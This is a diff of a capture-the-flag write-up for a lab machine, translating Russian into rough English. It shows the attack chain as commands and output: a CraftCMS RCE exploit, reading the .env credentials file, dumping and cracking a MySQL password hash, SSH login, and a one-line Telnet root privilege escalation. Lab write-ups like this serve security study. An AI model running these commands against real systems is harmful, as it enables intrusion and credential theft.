@@ -10,15 +10,15 @@
 
 ## 📌 Executive Summary
 
-Машина была скомпрометирована через RCE в CraftCMS (CVE-2025-32432), затем через чтение .env были получены пароли MySQL и далее SSH доступ пользователя adam. Повышение привилегий выполнено через уязвимость в Telnet (CVE-2026-24061).
+The machine was compromised through RCE in CraftCMS (CVE-2025-32432), then through read.env received MySQL passwords and further SSH access from adam. Privilege escalation was performed through a vulnerability in Telnet (CVE-2026-24061).
 
 ---
 
 ## 📊 Findings / Vulnerabilities
 
-| Уязвимость | CVE | Использование |
+| Vulnerability | CVE | Usage |
 | :--- | :--- | :--- |
-| CraftCMS Pre-Auth RCE | CVE-2025-32432 | Выполнение команд через exploit.py |
+| CraftCMS Pre-Auth RCE | CVE-2025-32432 | Executing commands via exploit.py |
 | Telnet Environment Injection | CVE-2026-24061 | `env USER='-f root' telnet -a 127.0.0.1` |
 
 ---
@@ -34,47 +34,47 @@ Port	Service	Version
 80/tcp	HTTP	nginx 1.18.0
 ---
 🌐 Web — CraftCMS RCE
-На странице /admin/login определена версия CraftCMS 5.6.16.
+The /admin/login page defines the CraftCMS version 5.6.16.
 
-Используем публичный эксплойт:
+Using a public exploit:
 
 bash
 python3 exploit.py -u http://orion.htb -c "id"
-Результат:
+Result:
 
 text
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ---
-🗄️ MySQL — пароль из .env
-Через тот же эксплойт читаем .env:
+🗄️ MySQL password from .env
+Using the same exploit, we read .env:
 
 bash
 python3 exploit.py -u http://orion.htb -c "cat /var/www/html/craft/.env"
-Найден пароль:
+Password found:
 
 text
 CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
-Подключаемся к MySQL и извлекаем хеш пароля пользователя adam:
+We connect to MySQL and extract the hash of the adam user's password:
 
 bash
 python3 exploit.py -u http://orion.htb -c "mysql -u root -p'SuperSecureCraft123Pass!' -D orion -e 'SELECT password FROM users;'"
-Хеш взломан через John/Hashcat → darkangel.
+The hash was hacked through John/Hashcat → darkangel.
 ---
-🔑 SSH — доступ как adam
+🔑 SSH access as adam
 bash
 ssh adam@10.129.93.166
 Password: darkangel
 ---
 🔐 Privilege Escalation — Telnet CVE-2026-24061
-Проверяем локальные порты:
+Checking the local ports:
 
 bash
 netstat -tulpn | grep 23
-Результат:
+Result:
 
 text
 tcp  0  0 127.0.0.1:23  0.0.0.0:*  LISTEN
-Эксплуатируем:
+We are exploiting:
 
 bash
 env USER='-f root' telnet -a 127.0.0.1
@@ -98,4 +98,3 @@ cat /root/root.txt
 text
 
 ---
-
